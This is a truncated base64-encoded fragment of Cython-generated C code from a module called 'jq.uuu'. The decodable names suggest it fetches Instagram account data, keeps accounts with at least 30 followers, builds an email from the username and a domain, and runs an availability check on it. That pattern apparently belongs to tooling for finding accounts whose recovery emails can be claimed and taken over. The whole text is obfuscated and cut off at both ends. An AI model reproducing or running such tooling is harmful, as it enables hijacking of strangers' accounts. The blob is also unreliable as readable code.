CBfX3B5eF90XzEyID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTIpKSBfX1BZWF9FUlIoMCwgNDQ5LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMik7XG4gICAgICAgICAgX19weXhfdF84ID0gMDtcbiAgICAgICAgICB7XG4gICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbM10gPSB7X19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGEsIF9fcHl4X3RfMTJ9O1xuICAgICAgICAgICAgX19weXhfdF85ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF84LCAoMy1fX3B5eF90XzgpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgNDQ5LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzkpO1xuICAgICAgICAgIH1cbiAgICAgICAgICBfX3B5eF90XzcgPSBfX3B5eF90Xzk7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgICAgX19weXhfdF8xMSA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDQ0OSwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgICAgIF9fcHl4X3RfOCA9IDA7XG4gICAgICAgICAge1xuICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzNdID0ge19fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3VzZXIsIF9fcHl4X3RfMTF9O1xuICAgICAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF84LCAoMy1fX3B5eF90XzgpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0NDksIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgfVxuICAgICAgICAgIF9fcHl4X3RfNCA9IF9fcHl4X3RfNjtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF80KTtcbiAgICAgICAgICBfX3B5eF90XzggPSAwO1xuICAgICAgICAgIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91c2VybmFtZX07XG4gICAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzgsICgyLV9fcHl4X3RfOCkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDQ5LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgIH1cbiAgICAgICAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF92X3VzZXJuYW1lLCBfX3B5eF90XzUpO1xuICAgICAgICAgIF9fcHl4X3RfNSA9IDA7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX3B5eF90XzcgPSBfX3B5eF92X3Jlc3BvbnNlO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzcpO1xuICAgICAgICAgIF9fcHl4X3RfOCA9IDA7XG4gICAgICAgICAge1xuICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNywgTlVMTH07XG4gICAgICAgICAgICBfX3B5eF90XzExID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2pzb24sIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDEtX19weXhfdF84KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDQ1MCwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7XG4gICAgICAgICAgfVxuICAgICAgICAgIF9fcHl4X3RfOSA9IF9fcHl4X3RfMTE7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfOSk7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQ1MSwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgICAgX19weXhfdF84ID0gMDtcbiAgICAgICAgICB7XG4gICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbM10gPSB7X19weXhfdF85LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGF0YSwgX19weXhfdF83fTtcbiAgICAgICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDMtX19weXhfdF84KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDUwLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgICAgIH1cbiAgICAgICAgICBfX3B5eF90XzYgPSBfX3B5eF90XzQ7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgX19weXhfdF8xMSA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDQ1MSwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgICAgIF9fcHl4X3RfOCA9IDA7XG4gICAgICAgICAge1xuICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzNdID0ge19fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3VzZXIsIF9fcHl4X3RfMTF9O1xuICAgICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF84LCAoMy1fX3B5eF90XzgpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0NTEsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgfVxuXG4gICAgICAgICAgXG4gICAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbmZvaW5zdGEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0NTAsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgICAgIGlmICh1bmxpa2VseSgoUHlPYmplY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X3ZfdXNlcm5hbWUsIF9fcHl4X3RfNSkgPCAwKSkpIF9fUFlYX0VSUigwLCA0NTAsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuXG4gICAgICAgICAgXG4gICAgICAgICAgX19weXhfdF80ID0gTlVMTDtcbiAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbmZvaW5zdGEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgNDUyLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7XG4gICAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgNDUyLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCA0NTIsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTtcbiAgICAgICAgICBfX3B5eF90XzggPSAxO1xuICAgICAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICAgICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF82KSkpIHtcbiAgICAgICAgICAgIF9fcHl4X3RfNCA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNik7XG4gICAgICAgICAgICBhc3NlcnQoX19weXhfdF80KTtcbiAgICAgICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF82KTtcbiAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzQpO1xuICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNiwgX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgICAgIF9fcHl4X3RfOCA9IDA7XG4gICAgICAgICAgfVxuICAgICAgICAgICNlbmRpZlxuICAgICAgICAgIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzQsIF9fcHl4X3ZfdXNlcm5hbWUsIF9fcHl4X3RfMTF9O1xuICAgICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF82LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzgsICgzLV9fcHl4X3RfOCkgfCAoX19weXhfdF84Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDUyLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgIH1cbiAgICAgICAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF92X3JyLCBfX3B5eF90XzUpO1xuICAgICAgICAgIF9fcHl4X3RfNSA9IDA7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3ZfcnIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0NTMsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs4XSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQ1MywgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfdl9mb3dzLCBfX3B5eF90XzYpO1xuICAgICAgICAgIF9fcHl4X3RfNiA9IDA7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX3B5eF90XzYgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X2Zvd3MsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8zMCwgUHlfR0UpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNik7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQ1NCwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19weXhfdF8xMyA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzYpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTMgPCAwKSkpIF9fUFlYX0VSUigwLCA0NTQsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgIGlmIChfX3B5eF90XzEzKSB7XG5cbiAgICAgICAgICAgIFxuICAgICAgICAgICAgX19weXhfdF82ID0gUHlOdW1iZXJfQWRkKF9fcHl4X3ZfdXNlcm5hbWUsIF9fcHl4X3ZfZG9tYWluKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgNDU1LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfdl9lbWFpbCwgX19weXhfdF82KTtcbiAgICAgICAgICAgIF9fcHl4X3RfNiA9IDA7XG5cbiAgICAgICAgICAgIFxuICAgICAgICAgICAgX19weXhfdF81ID0gTlVMTDtcbiAgICAgICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NoZWNrX29uKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDQ1NiwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7XG4gICAgICAgICAgICBfX3B5eF90XzggPSAxO1xuICAgICAgICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMTEpKSkge1xuICAgICAgICAgICAgICBfX3B5eF90XzUgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzExKTtcbiAgICAgICAgICAgICAgYXNzZXJ0KF9fcHl4X3RfNSk7XG4gICAgICAgICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF8xMSk7XG4gICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpO1xuICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzExLCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICAgICAgICBfX3B5eF90XzggPSAwO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICB7XG4gICAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIF9fcHl4X3ZfZW1haWx9O1xuICAgICAgICAgICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzExLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzgsICgyLV9fcHl4X3RfOCkgfCAoX19weXhfdF84Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQ1NiwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG5cbiAgICAgICAgICAgIFxuICAgICAgICAgIH1cbiAgICAgICAgfVxuXG4gICAgICAgIFxuICAgICAgfVxuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgZ290byBfX3B5eF9MMTJfdHJ5X2VuZDtcbiAgICAgIF9fcHl4X0w1X2Vycm9yOjtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzE0ID0gX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcygoKFB5T2JqZWN0ICopKCgoUHlUeXBlT2JqZWN0KilQeUV4Y19FeGNlcHRpb24pKSkpO1xuICAgICAgaWYgKF9fcHl4X3RfMTQpIHtcbiAgICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJqcS51dXUiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF82LCAmX19weXhfdF8xMSwgJl9fcHl4X3RfNSkgPCAwKSBfX1BZWF9FUlIoMCwgNDU4LCBfX3B5eF9MN19leGNlcHRfZXJyb3IpXG4gICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF82KTtcbiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzExKTtcbiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMSk7XG4gICAgICAgIF9fcHl4X3ZfZSA9IF9fcHl4X3RfMTE7XG4gICAgICAgICB7XG4gICAgICAgIH1cbiAgICAgICAgIHtcbiAgICAgICAgICB7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdl9lKTsgX19weXhfdl9lID0gMDtcbiAgICAgICAgICAgIGdvdG8gX19weXhfTDIyO1xuICAgICAgICAgIH1cbiAgICAgICAgICBfX3B5eF9MMjI6O1xuICAgICAgICB9XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgZ290byBfX3B5eF9MNl9leGNlcHRpb25faGFuZGxlZDtcbiAgICAgIH1cbiAgICAgIGdvdG8gX19weXhfTDdfZXhjZXB0X2Vycm9yO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X0w3X2V4Y2VwdF9lcnJvcjo7XG4gICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yKTtcbiAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMyk7XG4gICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfMiwgX19weXhfdF8zKTtcbiAgICAgIGdvdG8gX19weXhfTDFfZXJyb3I7XG4gICAgICBfX3B5eF9MNl9leGNlcHRpb25faGFuZGxlZDo7XG4gICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yKTtcbiAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMyk7XG4gICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfMiwgX19weXhfdF8zKTtcbiAgICAgIF9fcHl4X0wxMl90cnlfZW5kOjtcbiAgICB9XG4gIH1cblxuICBcblxuICBcbiAgX19weXhfciA9IFB5X05vbmU7IF9fUHl4X0lOQ1JFRihQeV9Ob25lKTtcbiAgZ290byBfX3B5eF9MMDtcbiAgX19weXhfTDFfZXJyb3I6O1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEyKTtcbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJqcS51dXUiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19weXhfciA9IE5VTEw7XG4gIF9fcHl4X0wwOjtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2RvbWFpbik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9iYmspO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfSWRvKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3JuZCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl91c2VyX2FnZW50KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X0lkKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2xzZCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9oZWFkZXJzKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2RhdGEpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfcmVzcG9uc2UpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfdXNlcm5hbWUpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfcnIpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZm93cyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9lbWFpbCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9lKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF9nYl8yanFfM3V1dV8yZ2VuZXJhdG9yMyk7XG4gIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cblxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMmpxXzIxcHJpbnRpbmcoUH